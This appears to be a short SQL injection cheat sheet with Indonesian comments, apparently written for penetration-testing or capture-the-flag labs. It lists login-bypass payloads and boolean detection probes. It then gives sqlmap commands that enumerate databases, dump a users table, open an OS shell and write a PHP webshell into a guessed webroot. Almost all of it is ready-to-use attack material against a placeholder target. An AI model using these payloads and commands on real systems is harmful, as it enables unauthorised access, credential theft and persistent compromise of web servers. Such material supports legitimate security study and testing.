# SQL Injection

## Auth Bypass (login form)
```text
'  OR  '1'='1'-- -
admin'-- -
') OR ('1'='1
```

## Deteksi (boolean)
```text
?id=1 AND 1=1     -> normal
?id=1 AND 1=2     -> beda
```

## sqlmap (otomatis)
```bash
sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch --dbs
sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch -D <db> --tables
sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch -D <db> -T users --dump

# Jika DB punya FILE privilege + webroot writable:
sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch --os-shell
#   --os-shell butuh lokasi webroot untuk menulis webshell. sqlmap akan:
#   (a) coba default + brute force direktori web umum secara otomatis, ATAU
#   (b) kita kasih path custom saat diminta, mis. /var/www/<nama-apps>
#       (tebak dari nama app/host, atau bocoran dari LFI/error). Pilih "custom location".
sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch --file-write shell.php --file-dest /var/www/<nama-apps>/shell.php
```
